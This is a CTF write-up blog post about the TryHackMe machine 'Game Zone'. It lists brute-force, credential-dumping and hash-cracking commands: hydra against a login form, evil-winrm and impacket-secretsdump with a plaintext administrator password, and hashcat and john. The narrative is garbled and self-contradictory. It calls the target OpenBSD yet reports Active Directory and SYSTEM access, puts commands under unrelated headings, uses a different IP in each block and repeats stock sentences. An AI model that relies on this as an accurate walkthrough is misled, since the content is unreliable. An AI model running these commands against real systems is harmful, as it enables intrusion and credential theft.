---
TitleSEO: "TryHackMe — Game Zone (Insane OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Game Zone (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Game Zone. Kerberoasting and Cron Job to achieve insane compromise on OpenBSD."
Keywords: "ctf, tryhackme, linux, reversing, web, active directory"
URL: "https://zurefx.github.io/writeups/htb-game-zone-957.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-game-zone-957/"
Date: "2025-11-19"
Tags: "CTF, TryHackMe, Linux, Reversing, Web, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-game-zone-957"
Permalink: "/writeups/htb-game-zone-957.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Game Zone** is rated **Insane** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.14.185.150`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p53,110,389 10.70.92.94 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

```bash
gobuster dir -u http://10.42.153.27/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

### Web Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.64.254.8/FUZZ
gobuster dir -u http://10.113.235.48/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Cron Job**.

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.243.153 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.112.223 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.97.158.157 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.1.26
```

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.85.78 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.47.230.170 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.129.210 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.33.224
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `hydra`
- `sharphound`
- `socat`
- `gobuster`
- `rpcclient`
- `wpscan`
- `burpsuite`
- `ldapsearch`

### Key Takeaways

- Kerberoasting
- Cron Job
- Writable PATH
